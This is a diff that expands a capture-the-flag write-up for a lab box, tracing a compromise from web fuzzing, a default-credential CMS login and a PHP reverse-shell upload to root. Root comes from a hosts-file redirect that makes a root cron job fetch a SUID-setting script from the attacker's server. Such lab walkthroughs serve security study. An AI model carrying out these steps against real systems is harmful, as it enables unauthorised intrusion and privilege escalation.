@@ -35,7 +35,7 @@ tags:
 
 ## Full Walkthrough
 
-First I scanned for directories.
+With the box only exposing a web server on the non-standard port `85`, my first move was to map out its content structure before doing anything else, so I ran a directory and file brute force against it with a broad extension list to catch anything a plain path fuzz might have missed.
 
 ```bash
 ffuf -w /usr/share/SecLists/Discovery/Web-Content/raft-small-words.txt -c -u http://mkingdom.thm:85/FUZZ -e html,php,php5,sh,bin,py,war,aspx,dox,lst,sqlite,txt,js,java,jar,htm --fc 403
@@ -71,12 +71,12 @@ app                     [Status: 301, Size: 312, Words: 20, Lines: 10]
 [WARN] Caught keyboard interrupt (Ctrl-C)
 ```
 
-Then afterwards found a login page went to that and did a bruteforce got valid credentials for `admin:password`
+That fuzz surfaced an `app` directory, which turned out to be running the Concrete5 CMS. Since it presented a standard admin login page, I threw a quick credential brute force at it before assuming I would need to find an exploit, and it paid off immediately: `admin:password` got me straight in, which is a good reminder that weak or default credentials are still worth testing first on any CMS login.
 
 ![Pasted image 20240724211420](Pasted-image-20240724211420.png)
 
 
-After going there I could edit what file extensions were allowed for file upload uploaded reverse.php payload and got access.
+Once inside the admin panel, I went looking for a way to turn that access into code execution, and Concrete5's file manager settings gave me exactly that: an option to control which file extensions are permitted for upload. Adding `php` to that allowlist meant I could upload a PHP reverse shell directly through a legitimate admin feature instead of needing a separate upload-bypass exploit. I dropped a `reverse.php` payload in, browsed to it, and landed a shell as `www-data`. From there I wanted to get a full picture of the box before hunting for privilege escalation specifically, so I kicked off automated enumeration to see what stood out.
 
 
 ```bash
@@ -93,6 +93,8 @@ After going there I could edit what file extensions were allowed for file upload
       Source: http://www.exploit-db.com/exploits/45010
 ```
 
+The exploit suggester flagged a handful of older kernel CVEs, but none of them felt like the intended path on a box built around a CMS, so I kept working through the rest of the enumeration output rather than committing to a kernel exploit against an unfamiliar build. The section that actually paid off was linpeas grepping through PHP configuration files for anything that looked like a stored credential, a very common place for CMS platforms to leave a database password sitting in plaintext.
+
 ```bash
 
 ╔══════════╣ Searching passwords in config PHP files
@@ -103,7 +105,7 @@ const UVTYPE_CHANGE_PASSWORD = 1;
             'password_credentials' => t('Password Credentials'),
 ```
 
-From here I found these credentials in the directory `/var/www/html/app/castle/application/config`.
+That match pointed me straight at Concrete5's own database configuration file, and reading it directly confirmed both a plaintext database password and the username it belonged to, sitting in `/var/www/html/app/castle/application/config`.
 
 ```bash
 (remote) www-data@mkingdom.thm:/var/www/html/app/castle/application/config$ cat database.php 
@@ -140,7 +142,7 @@ Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 mysql> 
 ```
 
-turns out we can `su toad` with the password and gain access to that user.
+That credential was for the local MySQL account, but database passwords get reused as system account passwords often enough that it was worth testing directly against `su`, and sure enough, `toad:toadisthebest` worked to switch users. With a new identity on the box, I re-ran linpeas from this vantage point to see whether `toad` had visibility into anything `www-data` did not.
 
 ```bash
 ╔══════════╣ .sh files in path
@@ -200,6 +202,8 @@ local_enable
 -rw------- 1 root root 333 Nov 24  2023 /etc/mysql/debian.cnf
 ```
 
+Most of that second linpeas pass came back clean, no writable passwd, no readable shadow, nothing obviously exploitable in the FTP or MariaDB configuration. But I make a habit of checking the environment directly as well, since linpeas does not always surface every custom variable a previous session might have left behind, and this time it was worth the extra look.
+
 ```bash
 (remote) toad@mkingdom.thm:/home/toad$ env
 APACHE_PID_FILE=/var/run/apache2/apache2.pid
@@ -230,9 +234,11 @@ LESSCLOSE=/usr/bin/lesspipe %s %s
 _=/usr/bin/env
 ```
 
-found `env` base64 encoded password for `mario` user was able to gain access to `mario` user account.
+Sitting right there among the environment variables was `PWD_token`, an oddly named value that decoded cleanly from base64 into what turned out to be a password for the `mario` account. Whoever set this up had clearly meant it as a quick, temporary way to pass a credential along, and it worked exactly as well for me as it presumably did for them: `su mario` succeeded without any trouble.
 
-using pspy I found that it was downloading a file and moving it to a log file we can write to this file so lets do so
+With a second lateral move made, I turned to `pspy` to watch what root-owned processes were doing in the background, since neither `toad` nor `mario` had any `sudo` rights worth exploring directly. That observation paid off almost immediately: I caught a cron job running as root that curls a file down from the local web application and pipes it into a log under a path I already knew I had write access to. If I could control the content being fetched, I could get root to execute arbitrary code on my behalf.
+
+Before assuming I could just overwrite the script directly, I checked permissions across that application directory to see exactly what I could and could not touch.
 
 ```bash
 (remote) mario@mkingdom.thm:/var/www/html/app/castle/application$ ls -aril
@@ -263,6 +269,8 @@ total 80
 ```
 
 
+`counter.sh` itself turned out to be owned by root and not writable by me, so overwriting it directly was off the table. But the cron job reaches it through the `mkingdom.thm` hostname rather than a hardcoded loopback address, which gave me a different angle: if I could control how that hostname resolves, I could make root's own request fetch a file from somewhere I do control instead.
+
 ```bash
 (remote) mario@mkingdom.thm:/var/www/html/app/castle$ cat /etc/hosts
 127.0.0.1	localhost
@@ -279,13 +287,17 @@ ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 ```
 
-edited the hosts file since it was downloading it from the `mkingdom.thm` domain.
+That confirmed the cron job resolves `mkingdom.thm` through this local file rather than any external DNS, and since I had write access to it, I edited the entry to point the domain at my own attacking machine's VPN address instead of the box itself. That single change meant the next time root's cron job fired its `curl` request, it would reach out across the network to a server I controlled rather than fetching the legitimate local script.
+
+All I needed on the serving end was something simple: a script that grants the SUID bit to `/bin/bash` the moment root executes it, which is enough on its own to hand me a permanent path to a root shell afterward.
 
 ```bash
 #!/bin/bash
 
 chmod u+s /bin/bash
 ```
+
+With the hosts entry poisoned and the payload named to match exactly what the cron job requests, all that was left was to wait for the next scheduled run and watch `pspy` confirm it executed as root.
 
 ```bash
 2024/07/24 22:52:01 CMD: UID=0    PID=11395  | bash 
@@ -295,12 +307,16 @@ r/log/up.log
 2024/07/24 22:52:01 CMD: UID=0    PID=11392  | CRON 
 ```
 
+Sure enough, my listener on the attacking machine logged an incoming request straight from the target box for that exact file, confirming the poisoned hosts entry had worked and root had just fetched my malicious script instead of the legitimate one.
+
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/mkingdom] - [Wed Jul 24, 22:55]
 └─[$]> sudo python3 -m http.server 85
 Serving HTTP on 0.0.0.0 port 85 (http://0.0.0.0:85/) ...
 10.10.61.66 - - [24/Jul/2024 22:56:01] "GET /app/castle/application/counter.sh HTTP/1.1" 200 -
 ```
+
+Checking back on the target confirmed the payoff: `/bin/bash` now carried the setuid bit, owned by root, which meant running it directly would drop me into a root shell any time I wanted from that point forward.
 
 ```bash
 
